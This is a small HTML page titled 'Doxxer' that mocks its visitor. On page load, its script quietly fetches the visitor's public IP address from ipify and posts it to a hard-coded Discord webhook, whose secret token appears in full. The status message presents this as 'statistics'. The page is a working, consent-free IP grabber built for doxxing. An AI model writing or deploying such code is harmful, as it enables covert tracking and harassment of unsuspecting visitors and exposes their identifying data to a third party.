<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Doxxer</title>
  <style>
    body { font: 16px/1.5 system-ui, sans-serif; max-width: 650px; margin: 10vh auto; padding: 0 1rem; color: #202124; }
    main { border: 1px solid #ddd; border-radius: 14px; padding: 1.5rem; }
    #status { overflow-wrap: anywhere; }
  </style>
</head>
<body>
  <main>
    <h1>Doxxer</h1>
    <p>If you entered this page you are a dumbass</p>
    <p id="status" role="status" aria-live="polite">Sending ip…</p>
  </main>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1562209217975296055/FXfnIyH4HWzY33l45Wv-4bMtQm5CpHFl5DEdlum3XgEJWUzSNjCqvasc-zGoBLML__LD";

    async function sendVisitStats() {
      const status = document.getElementById("status");
      try {
        if (!DISCORD_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/") &&
            !DISCORD_WEBHOOK_URL.startsWith("https://discordapp.com/api/webhooks/")) {
          throw new Error("Configure DISCORD_WEBHOOK_URL in the HTML file.");
        }

        const response = await fetch("https://api.ipify.org?format=json");
        if (!response.ok) throw new Error("Could not retrieve the public IP address.");
        const { ip } = await response.json();

        const sent = await fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `New visit — Public IP: ${ip}`
          })
        });

        if (!sent.ok) {
          throw new Error("Could not send to the webhook. The browser may block the request because of CORS; a proxy server may be required.");
        }
        status.textContent = "Statistics sent successfully.";
      } catch (error) {
        status.textContent = `Could not send statistics: ${error.message}`;
      }
    }

    // Runs automatically when the page loads.
    window.addEventListener("DOMContentLoaded", sendVisitStats);
  </script>
</body>
</html>
